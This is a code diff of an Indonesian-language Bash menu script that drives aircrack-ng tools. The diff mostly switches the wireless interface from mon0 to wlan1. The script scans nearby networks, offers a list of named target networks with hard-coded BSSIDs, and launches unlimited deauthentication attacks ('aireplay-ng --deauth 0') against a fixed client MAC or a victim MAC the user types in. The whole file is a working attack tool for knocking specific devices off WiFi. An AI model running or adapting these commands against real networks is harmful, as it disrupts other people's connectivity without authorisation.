@@ -21,8 +21,8 @@ blue="\033[1;34m"
 transparent="\e[0m"
 
 main(){
+	clear;
 
-	clear
 	echo "==========================";
 	#sudo airmon-ng;
 	cekInterface;
@@ -36,8 +36,8 @@ main(){
 	echo "==========================";
 	read  -p "Pilih  : " a
 	if [[ $a == 1 ]]; then
-		hidup
-		main
+		hidup;
+		main;
 	elif [[ $a == 2 ]]; then
 		mati;
 		main;
@@ -46,7 +46,7 @@ main(){
 		main;
 
 	elif [[ $a == 4 ]]; then
-		# sudo airodump-ng mon0;
+		# sudo airodump-ng wlan1;
 		pilihScan;
 	elif [[ $a == 5 ]]; then
 		bunuh;
@@ -60,14 +60,14 @@ main(){
 }
 
 bunuh(){
-	sudo aireplay-ng --deauth 0 -a 98:DE:D0:BD:0F:E0 -c 50:64:2B:25:F8:AB --ignore-negative-one mon0
+	sudo aireplay-ng --deauth 0 -a 98:DE:D0:BD:0F:E0 -c 50:64:2B:25:F8:AB --ignore-negative-one wlan1
 	
 	
 }
 
 hidup(){
-	t1=$(ifconfig | grep -o mon0)
-	t2='mon0'
+	t1=$(ifconfig | grep -o wlan1)
+	t2='wlan1'
 
 	if [ "$t1" = "$t2" ]; then
 	  main
@@ -79,12 +79,10 @@ hidup(){
 
 
 mati(){
-	sudo airmon-ng stop mon0;
+	sudo airmon-ng stop wlan1;
 }
-
-
 status(){
-	sudo airmon-ng
+	sudo airmon-ng;
 }
 loading(){
 	clear;
@@ -103,16 +101,16 @@ loading(){
 }
 serang(){
 	read  -p "INPUT MAC Target :" korban
-	sudo aireplay-ng --deauth 0 -a $target -c $korban --ignore-negative-one mon0
+	sudo aireplay-ng --deauth 0 -a $target -c $korban --ignore-negative-one wlan1
 	main;
 }
 
 pilihScan(){
-	t1=$(ifconfig | grep -o mon0)
-	t2='mon0'
+	t1=$(ifconfig | grep -o wlan1)
+	t2='wlan1'
 
 	if [ "$t1" = "$t2" ]; then
-	  	sudo airodump-ng mon0;
+	  	sudo airodump-ng wlan1;
 	  	echo "";
 		echo  "1 = BUjANGRESIDENCE";
 		echo  "2 = BUjANGRESIDENCE_plus";
@@ -125,7 +123,7 @@ pilihScan(){
 		elif [[ $pilih == 3 ]]; then
 			target="34:CE:00:7A:8D:60";
 	    fi
-		sudo airodump-ng --bssi $target mon0
+		sudo airodump-ng --bssi $target wlan1
 		
 		read  -p "Ingin Melakukan Serangan? (Y/N) : " serang
 		if [[ $serang == y ]]; then
@@ -148,8 +146,8 @@ pilihScan(){
 }
 
 cekInterface(){
-	t1=$(ifconfig | grep -o mon0)
-	t2='mon0'
+	t1=$(ifconfig | grep -o wlan1)
+	t2='wlan1'
 
 	if [ "$t1" = "$t2" ]; then
 	  echo -e "$green+ Mode Monitor Aktif \033[1;m";
